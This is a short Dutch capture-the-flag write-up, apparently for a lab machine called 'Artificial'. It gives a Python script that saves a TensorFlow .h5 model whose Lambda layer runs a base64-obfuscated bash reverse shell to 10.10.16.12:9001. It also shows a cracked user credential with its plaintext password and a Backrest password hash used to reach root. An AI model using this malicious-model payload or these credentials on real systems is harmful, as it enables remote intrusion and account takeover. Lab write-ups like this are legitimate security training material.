# Artifical

Op de webpagina is een manier om h5 models die gemaakt worden door tensorflow te
laden. Nu kun je in tensorflow ook een lambda laag toevoegen die gewoon code
uitvoer. Hiermee kunnen we dus een evil-h5 model maken en daarmee code
uitvoeren.

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system('bash -c "$(echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMi85MDAxIDA+JjE= | base64 -d)"')
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Hiermee hebben we een revshell te pakken. Natuurlijk is hier een `users.db` met
daarin een aantal users die we in hashcat kunnen gooien

```
gael:c99175974b6e192936d97224638a34f8:mattp005numbertwo
```

Hiermee hebben we ook ssh te pakken.

## Privesc

Op de server komen we met `netstat -tunlp` een server tegen die backrest spul
exposed. Deze draait in `/opt/backrest`. Daarnaast is er in `/var/backups` een
user-readable backup hiervan. 

Hiermee hebben we een config te pakken waar een wachtwoord instaat waarmee we
kunnen inloggen op backrest (`bcrypt` die `base64` encoded is).

Het gaat dan om:

```
backrest_root:2d852d12f49b699238b025c1f11dbb54
```

In backrest kunnen we een backup maken van de root folder en met de integrated
terminal die daar aanwezig is ook de flag droppen. 
